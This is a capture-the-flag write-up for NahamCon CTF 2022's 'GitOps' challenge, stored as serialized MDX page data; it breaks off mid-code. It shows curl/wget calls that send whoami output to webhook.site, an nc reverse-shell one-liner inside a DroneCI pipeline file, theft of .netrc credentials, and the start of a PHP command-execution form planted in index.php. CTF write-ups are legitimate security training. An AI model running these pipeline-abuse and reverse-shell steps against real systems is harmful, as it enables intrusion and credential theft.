{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var t=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var i=a=>t(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{i(a);for(var c in s)t(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let n of h(s))!m.call(a,n)&&n!==\"default\"&&t(a,n,{get:()=>s[n],enumerable:!(c=d(s,n))||c.enumerable});return a},g=a=>k(i(t(a!=null?r(p(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((x,l)=>{l.exports=_jsx_runtime});var v={};N(v,{default:()=>w,frontmatter:()=>f});var e=g(o()),f={title:\"NahamCon CTF 2022 \\u2013 GitOps\",date:\"2022-05-02\",draft:!1,authors:[\"TheButcher\"],tags:[\"NahamCon CTF 2022\",\"Misc\",\"DevOps\",\"Git\",\"Pipeline\",\"Gitea\",\"DroneCI\"],summary:\"Abuse the pipeline execution process to gain access to the host.\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",br:\"br\",h2:\"h2\",ul:\"ul\",li:\"li\",em:\"em\",img:\"img\",strong:\"strong\",pre:\"pre\",h3:\"h3\"},a.components);return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h1,{id:\"gitops\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#gitops\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"GitOps\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Challenge Author: @congon4tor#2334\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"Someone leaked their git credentials (\",(0,e.jsx)(n.code,{children:\"developer:2!W4S5J$6e\"}),\"). How deep can you infiltrate?\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"This challenge uses vhosts.\",(0,e.jsx)(n.br,{}),`\n`,\"Visit git.challenge.nahamcon.com:[YOUR_PORT]\",(0,e.jsx)(n.br,{}),`\n`,\"Visit drone.challenge.nahamcon.com:[YOUR_PORT]\",(0,e.jsx)(n.br,{}),`\n`,\"Visit web.challenge.nahamcon.com:[YOUR_PORT]\"]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"challenge-summary\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#challenge-summary\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Challenge Summary\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"In this challenge, we are given 3 different services to attack. There is an automated process that pushes the Master Branch of the Git Repository to the main webserver of the organisation. To complete this challenge, we will need to create a new commit with a modified DroneCI configuration file to abuse the pipeline execution process to gain access to the host running DroneCI and Gitea. Once on that host, we can find some credentials for another user allowed to review codes written by peers. With these information, we can inject malicious code in \",(0,e.jsx)(n.code,{children:\"index.php\"}),\" by creating a new commit with the developer account and use the DroneCI account to approve and merge the malicious commit on the Master Branch. Our malicious Master Branch will then be pushed to the WebServer, and we are now able to gain code execution and grab the flag.\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"initial-reconnaissance\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#initial-reconnaissance\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Initial Reconnaissance\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.code,{children:\"Git.challenge.nahamcon.com\"})}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We can confirm that the application version with the page footer: \",(0,e.jsx)(n.em,{children:\"Powered by Gitea Version: 1.16.0\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We have valid credentials given by the challenge creator \",(0,e.jsx)(n.code,{children:\"developer:2!W4S5J$6e\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Once loggedIn, we have access to only 1 private repository, there is no public one, and we cannot create a new one \",(0,e.jsx)(n.em,{children:\"(Limit set to 0)\"})]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/repository.png\",alt:\"Web Repository main page\"}),`\n`,(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/readme.png\",alt:\"ReadMe Screenshot\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.code,{children:\"Drone.challenge.nahamcon.com\"})}),`\n`,(0,e.jsx)(n.p,{children:\"After some quick research, we can understand that drone is the application that automates the process to keep the webserver up to date.\"}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Drone by Harness\\u2122 is a modern Continuous Integration platform that empowers busy teams to automate their build, test and release workflows using a powerful, cloud native pipeline engine. \",(0,e.jsx)(n.em,{children:(0,e.jsx)(n.a,{href:\"https://docs.drone.io/\",children:\"https://docs.drone.io/\"})})]}),`\n`]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Navigating the docs, we found an interesting feature, \",(0,e.jsx)(n.a,{href:\"https://docs.drone.io/pipeline/exec/overview/\",children:(0,e.jsx)(n.strong,{children:\"Exec Pipeline\"})}),\".\"]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"An exec pipeline executes shell commands directly on the host machine without isolation. This is useful for workloads that need to run on the host, or are poorly suited for execution inside containers.\"}),`\n`]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"The \",(0,e.jsx)(n.code,{children:\"Drone.yml\"}),\" file in the web repository is probably the drone config file. And from the \",(0,e.jsx)(n.code,{children:\"README.md\"}),\" we can assume it gets run when we make a pull request to ensure our new code passes all the required checks.\"]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.code,{children:\"Web.challenge.nahamcon.com\"})}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"This is the webserver, in the \",(0,e.jsx)(n.code,{children:\"ReadMe.md\"}),\" from the Web repository, we learned that every minute, the GitOps system will push the \",(0,e.jsx)(n.code,{children:\"master\"}),\" branch to this server.\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Our gitops system will pull your changes every minute and update the website automatically.\"}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"We can assume this is the server containing the flag.\"}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"testing-for-remote-code-execution\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#testing-for-remote-code-execution\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Testing for Remote Code Execution\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"In our initial test, we tried to contact a webhook from \",(0,e.jsx)(n.a,{href:\"https://webhook.site/\",children:\"https://webhook.site/\"}),\". We added the following code to \",(0,e.jsx)(n.code,{children:\"drone.yml\"}),\".\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-yaml\",children:(0,e.jsxs)(n.code,{className:\"language-yaml code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# ...\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" curl https\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\"//webhook.site/2289b2a6\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"580c\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"4091\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"90a4\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`4356e97c6fc0/$(whoami)\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" wget https\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\"//webhook.site/2289b2a6\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"580c\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"4091\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"90a4\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`4356e97c6fc0/$(whoami)\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/drone_whoami.png\",alt:\"Initial Testing\"})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:\"Note:\"}),\" We inserted a request with \",(0,e.jsx)(n.code,{children:\"curl\"}),\" and with \",(0,e.jsx)(n.code,{children:\"wget\"}),\" in case one of them is not installed on the system.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can now check our webhook to see if the commands were successfully executed, and we can see two new requests, one with \",(0,e.jsx)(n.code,{children:\"curl\"}),\" and one with \",(0,e.jsx)(n.code,{children:\"wget\"}),\". It worked, and we even have root privileges over the target machine!\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/webhook_whoami.png\",alt:\"Webhook.site Result\"})}),`\n`,(0,e.jsxs)(n.h2,{id:\"bonus-how-to-get-command-output-without-webhook\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#bonus-how-to-get-command-output-without-webhook\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Bonus: How to get command output without webhook\"]}),`\n`,(0,e.jsx)(n.p,{children:\"In this challenge, the target machine is connected to internet, but what if it was only accessible within the local network, or if it had a very strict firewall policy and you can\\u2019t exfiltrate data via the WAN network ?\"}),`\n`,(0,e.jsx)(n.p,{children:\"This is where the drone application can help us, when we access the Drone web UI, we can see the result of our command in the output log.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/output_whoami.png\",alt:\"DroneCI output for initial testing\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We could do all our enumeration processes and root the target box this way, but it would be quite repetitive to create a new commit for each command then go to DroneCI to check the output...\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"getting-reverse-shell\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#getting-reverse-shell\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Getting Reverse shell\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will reproduce the same steps as the \",(0,e.jsx)(n.code,{children:\"whoami\"}),\" command execution, but instead, we used some simple commands to gather more information about the target system.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-yaml\",children:(0,e.jsxs)(n.code,{className:\"language-yaml code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token key atrule\",children:\"steps\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token key atrule\",children:\"name\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),` linting\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token key atrule\",children:\"commands\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" phplint \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`lint .\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" uname \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`a\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),` cat /etc/issue\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" find $(echo $PATH \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"|\"}),\" sed 's/\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`/ /g')\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" find / \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"perm /o+w \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`type d\n`]})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"stripped-output-response\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stripped-output-response\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stripped output Response\"]}),`\n`,(0,e.jsx)(n.p,{children:\"We only keep the most relevant data, to keep this list smaller but we had every binary on the default Environment Path\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`+ uname -a\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Linux gitops-5edbd6bd8fd79ba1-c77694485-8gjlx 5.4.144+ #1 SMP Wed Nov 3 09:56:10 PDT 2021 x86_64 Linux\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`+ cat /etc/issue\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Welcome to Alpine Linux 3.15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Kernel \\\\r on an \\\\m (\\\\l)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`+ find $(echo $PATH | sed 's/:/ /g')\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/local/bin/php\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/wget\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/nc\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/whoami\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/mkfifo\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-receive-pack\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-upload-pack\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-upload-archive\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-shell\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/curl\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/sh\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/base64\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/mktemp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/ash\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/busybox\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`+ find / -perm /o+w -type d\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/var/tmp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/var/www/html\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/dev/shm\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/tmp\n`})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"key-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#key-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Key Points\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We do not have \",(0,e.jsx)(n.code,{children:\"bash\"}),\" but we have access to \",(0,e.jsx)(n.code,{children:\"ash\"}),\" and \",(0,e.jsx)(n.code,{children:\"sh\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We can write in the \",(0,e.jsx)(n.code,{children:\"/tmp\"}),\" folder\"]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"No \",(0,e.jsx)(n.code,{children:\"python\"}),\", but \",(0,e.jsx)(n.code,{children:\"Perl\"}),\" and \",(0,e.jsx)(n.code,{children:\"nc\"}),\" are present\"]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Running Alpine Linux 3.15, which is a based on busybox, so limited commands\"}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"x86_64 Linux If we would like to compile executable for the target\"}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"We could use the Git CLI from this box to interact with the Repo instead of the Web UI\"}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h3,{id:\"generating-the-payload\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#generating-the-payload\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Generating the payload\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"With these information, there are multiple ways of gaining a remote shell on the target computer, we choose the following payload for this challenge, repeat the previous steps and include it in \",(0,e.jsx)(n.code,{children:\"drone.yml\"})]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc x.x.x.x 80 >/tmp/f\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Start a listener on the selected port and catch the reverse shell with \",(0,e.jsx)(n.code,{children:\"nc -lnvp 80\"})]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-shell\",children:(0,e.jsxs)(n.code,{className:\"language-shell code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lnvp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"listening on \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"any\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"connect to \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"192.168\"}),\".0.181\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" from \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"UNKNOWN\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"192.168\"}),\".0.149\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"51978\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/bin/ash: can't access \",(0,e.jsx)(n.span,{className:\"token function\",children:\"tty\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),` job control turned off\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/tmp/drone-u2aFxfYSGZ02aua6/done/src \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# whoami && id && ip a\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`root\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"uid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"gid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"groups\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",2\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"daemon\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",3\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"sys\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",4\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"adm\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",6\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"disk\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",10\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"wheel\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",11\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"floppy\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",20\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dialout\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",26\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"tape\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",27\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"video\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\": lo: \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"LOOPBACK,UP,LOWER_UP\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" mtu \",(0,e.jsx)(n.span,{className:\"token number\",children:\"65536\"}),\" qdisc noqueue state UNKNOWN qlen \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1000\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    inet \",(0,e.jsx)(n.span,{className:\"token number\",children:\"127.0\"}),\".0.1/8 scope \",(0,e.jsx)(n.span,{className:\"token function\",children:\"host\"}),` lo\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        valid_lft forever preferred_lft forever\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\": eth0@if2010: \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" mtu \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1040\"}),` qdisc noqueue state UP \n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    link/ether ea:9c:38:bf:2f:e6 brd ff:ff:ff:ff:ff:ff\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    inet \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.112\"}),\".9.241/32 brd \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.112\"}),`.9.241 scope global eth0\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        valid_lft forever preferred_lft forever\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/tmp/drone-u2aFxfYSGZ02aua6/done/src \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"post-exploitation\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#post-exploitation\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Post Exploitation\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Looking around the system, we found a really interesting file in the \",(0,e.jsx)(n.em,{children:\"Docker DroneCi Home folder\"}),\" named \",(0,e.jsx)(n.code,{children:\".netrc\"}),\", we took a look inside, we had credentials for another user. We tried them against the Gitea application and successfully logged in as \",(0,e.jsx)(n.em,{children:\"DroneCI\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`/tmp/drone-u2aFxfYSGZ02aua6/home/drone # cat .netrc\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`machine git.challenge.nahamcon.com login droneci password t4K0@s!qSF\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/tmp/drone-u2aFxfYSGZ02aua6/home/drone #\n`})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"pivoting-to-web-server\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#pivoting-to-web-server\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Pivoting to Web Server\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Remember in the \",(0,e.jsx)(n.code,{children:\"README.md\"}),\", we had to get someone else to approve our code before it gets merged into the Master Branch. We will use our newly discovered account to approve our malicious commit.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will add a simple command execution form in the \",(0,e.jsx)(n.code,{children:\"index.php\"}),\" file, and I always like to put a \",(0,e.jsx)(n.code,{children:\"phpinfo();\"}),\", This ways, if per example \",(0,e.jsx)(n.code,{children:\"system()\"}),\" command is disabled on the server, with the \",(0,e.jsx)(n.code,{children:\"phpinfo\"}),\", I will be able to confirm I can execute PHP code, and you should be able to view which functions are restricted and tons of useful information on the target.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-php\",children:(0,e.jsxs)(n.code,{className:\"language-php code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"<\"}),\"form\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"method\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"GET\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token 